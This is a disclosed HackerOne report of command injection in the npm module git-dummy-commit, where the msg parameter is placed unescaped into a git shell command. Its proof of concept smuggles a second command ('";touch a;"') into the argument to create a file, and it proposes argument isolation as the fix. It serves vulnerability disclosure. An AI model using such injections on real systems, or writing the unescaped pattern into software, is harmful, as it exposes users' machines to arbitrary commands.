# [git-dummy-commit] Command injection on the msg parameter

## Report Details
- **Report ID**: 341710
- **URL**: https://hackerone.com/reports/341710
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-04-22T03:26:03.610Z
- **Disclosed**: 2018-06-15T21:59:11.029Z

## Reporter
- **Username**: caioluders
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi there, I've found a Command Injection on the "git-dummy-commit" module.

# Module

**module name:** git-dummy-commit
**version:** 1.3.0
**npm page:** https://www.npmjs.com/package/git-dummy-commit

## Module Description

> Create a dummy commit for testing

## Module Stats

[62] downloads in the last day
[94] downloads in the last week
[384] downloads in the last month
[6078]  downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `msg` parameter to a command on the [line 37](https://github.com/stevemao/git-dummy-commit/blob/master/index.js#L37)  without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module 

```
$ npm install git-dummy-commit
```

* Example code with the malicious payload `";touch a;"` on line 3.

```javascript
const gitDummyCommit = require('git-dummy-commit');

gitDummyCommit('";touch a;"');
```
* Run it.

```
$ node index.js
```

* Check the newly create file `a` 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `git` command.

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `msg` parameter can injection command on the victim's machine.

## Attachments
No attachments
